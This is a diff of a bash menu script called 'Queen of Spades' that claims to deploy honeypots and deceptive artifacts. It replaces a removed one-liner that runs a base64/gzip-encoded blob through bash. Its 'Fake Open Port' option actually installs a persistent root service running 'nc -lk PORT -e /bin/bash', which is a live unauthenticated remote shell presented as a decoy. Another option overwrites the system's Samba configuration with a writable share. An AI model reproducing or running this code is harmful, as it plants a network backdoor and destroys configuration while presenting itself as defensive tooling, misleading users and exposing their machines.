@@ -1,1 +1,93 @@
-bash -c "$(echo H4sICIHxXmcAA1F1ZWVuX29mX1NwYWRlcwDNWN9v2zYQfvdfcVMDeN1gOYnbPDTwgCxx12JAl80NhiEaDJo8R4IlUhCpJELb/31HSpZ/ylbSPUQvkcj77o7H7z7SefVDfxrJ/pTpsNO5/Ofi07AbHA8Gtyfng7Ok2/lrNB59roaO6bsjkGNqIiUnBnn442v40gF6HsIoRjBZjucglBuyD4+RZfUXART0ELyjLzbSN299xnOvk9bPLvhXWHv+zBElqBmMUyZQr819bcJfYRqrgv5wVWhgUthXu+h7hIvMRDPGjW7Ct0+/MX7Lpwl/4sNlhsxguQK40ZjBBecql0a3wJ/6iwq8Z3OE8fgDfFASi1SZVvEHq/Grsr237Fip3T78Gx/GaOAmLeP/kdIOXqvMrO9eM/5tHd/hP6F5UNkcxiHLsM36z3wYPUbra21f/+fvf9kYruGoM+o5WoqAXgreZagiju8oDndvyyZjGuGoHIRI1uP2OXm99unM13pyRwquN10JI3m3i0S+7y8T3XRU5zuShjDCwXOCS5a47N3IxI5sYXUulLNlgnwklMzSeDuSs06Z1g9kHB8w3lzfVZ0XrOCAO+YI1/Wx4nMUe5a66fOaCGYFo4A5FmAUcCWphjm2KJiEE+jprcnz87Wh0+duZ9nRdj+3mnpvcq7G9nCAHodu7fXV8tQIpBsNvNox0YTqEHiB1DFiCgMyoYby4Bfo5zrrU11Z7PAzgvS0Dru74/IwUQJ+fmyCtc329kZG5t9AXqHmWeROr2Gd7Rize2qcQAbytnon09Ej8rFhmRk2xHb2H6U2LI7J/m9GbBe/FsMkj03Us1zyCX6H5bLR8L4utMFEVH9rR74ugzbUoLTmJgaUbEoquok7BNN2FYdRm4Sp6xMutF84CtneII5XAQRU/l5Ulwz+D9HbeXLtTbE8BX5DSfrlvNiiU4GkjpyrGbnSJNDQN0lKnlp1m3edRff2MPsdC0clwvZLwUrLmQmVsYE8m66sVqpMvIMwt+J8uumwmte+eTTbLst2PDs+bkii0VUbMa7KbWsErL4oLOR4UbSXxLI3z2UZ3W4cPbZvOE85WFMCgMyTKb3T8nREymN5osibPWYt+SbWaD81PJddV3I6QudwVKNswrXGdxuk2xo2sHivdh9Oq4V412V7knSnC8B3a7f19CzxXgU+Qb33wnbKt6VCyZMKBlkupaWeqsaX+/2iWuvtdwv4jqv/4XtOMhdRZlvMbfBEW1grYb1d2hOfUmZCGK46CaRbvZJxQRNSBXKaqQftKDGEAnUgl1RjyZT1dTL1qayzJmJV+0lmgirrWNKOE7Kqictred01q+m+KC6cbXNhMwn7c402fW/IKcWcH4r10+FYH+U9iyNR/Qbz4XNWALtjkdwTeyUKasbdh6BrVefb5v9TOv8BLHmDBo8RAAA= | base64 -d | gunzip)"
+#!/bin/bash
+
+CYAN='\033[1;36m'
+RESET='\033[0m'
+
+deception_tech() {
+    while true; do
+        clear
+        echo -e "${CYAN}"
+        echo "     __________________________________________"
+        echo "    |              Queen of Spades             |"
+        echo "    |   Deploy Decoys and Deceptive Artifacts  |"
+        echo "    |__________________________________________|"
+        echo "    |                                          |"
+        echo "    |  1. Create Decoy User Accounts           |"
+        echo "    |  2. Deploy Fake SSH Honeypot             |"
+        echo "    |  3. Create Deceptive File Artifacts      |"
+        echo "    |  4. Set Up Fake Open Ports               |"
+        echo "    |  5. Create Fake Network Shares           |"
+        echo "    |  6. Exit                                 |"
+        echo "    |__________________________________________|"
+        echo -e "${RESET}"
+
+        read -p "Choice: " choice
+        case $choice in
+            1)
+                clear
+                echo -e "${CYAN}Creating Decoy User Accounts...${RESET}"
+                read -p "Enter decoy username: " decoy_user
+                sudo useradd -m "$decoy_user"
+                sudo passwd -l "$decoy_user"
+                echo -e "${CYAN}Decoy user $decoy_user created and locked.${RESET}"
+                echo -e "${CYAN}Press any key to continue...${RESET}"
+                read -n 1 -s
+                ;;
+            2)
+                clear
+                echo -e "${CYAN}Deploying Fake SSH Honeypot...${RESET}"
+                sudo bash -c 'echo -e "#!/bin/bash\necho \"Fake SSH Access\"\nsleep 3\nexit" > /usr/local/bin/fake-ssh'
+                sudo chmod +x /usr/local/bin/fake-ssh
+                sudo bash -c 'echo -e "[Unit]\nDescription=Fake SSH Service\n\n[Service]\nExecStart=/usr/local/bin/fake-ssh\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/fake-ssh.service'
+                sudo systemctl enable fake-ssh.service
+                sudo systemctl start fake-ssh.service
+                echo -e "${CYAN}Fake SSH honeypot deployed as a systemd service.${RESET}"
+                echo -e "${CYAN}Press any key to continue...${RESET}"
+                read -n 1 -s
+                ;;
+            3)
+                clear
+                echo -e "${CYAN}Creating Deceptive File Artifacts...${RESET}"
+                echo "Generating fake sensitive files in /tmp..."
+                sudo bash -c 'echo "Private Key" > /tmp/decoy_private_key'
+                sudo bash -c 'echo "Password: hunter2" > /tmp/decoy_passwords.txt'
+                chmod 600 /tmp/decoy_private_key /tmp/decoy_passwords.txt
+                echo -e "${CYAN}Deceptive file artifacts created in /tmp.${RESET}"
+                echo -e "${CYAN}Press any key to continue...${RESET}"
+                read -n 1 -s
+                ;;
+            4)
+                clear
+                echo -e "${CYAN}Setting Up Fake Open Ports...${RESET}"
+                read -p "Enter port number to simulate open: " fake_port
+                sudo bash -c "echo 'nc -lk $fake_port -e /bin/bash' > /usr/local/bin/fake-port"
+                sudo chmod +x /usr/local/bin/fake-port
+                sudo bash -c 'echo -e "[Unit]\nDescription=Fake Open Port\n\n[Service]\nExecStart=/usr/local/bin/fake-port\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/fake-port.service'
+                sudo systemctl enable fake-port.service
+                sudo systemctl start fake-port.service
+                echo -e "${CYAN}Fake open port service running on port $fake_port.${RESET}"
+                echo -e "${CYAN}Press any key to continue...${RESET}"
+                read -n 1 -s
+                ;;
+            5)
+                clear
+                echo -e "${CYAN}Creating Fake Network Shares...${RESET}"
+                sudo mkdir -p /fake_share
+                sudo bash -c 'echo "[fake_share]\npath = /fake_share\nread only = no\nbrowsable = yes\n" > /etc/samba/smb.conf'
+                sudo service smbd restart
+                echo -e "${CYAN}Fake network share created at /fake_share.${RESET}"
+                echo -e "${CYAN}Press any key to continue...${RESET}"
+                read -n 1 -s
+                ;;
+            6)
+                echo -e "${CYAN}Exiting...${RESET}"
+                break
+                ;;
+            *)
+                echo -e "${CYAN}Invalid choice. Try again.${RESET}"
+                ;;
+        esac
+    done
+}
+
+deception_tech
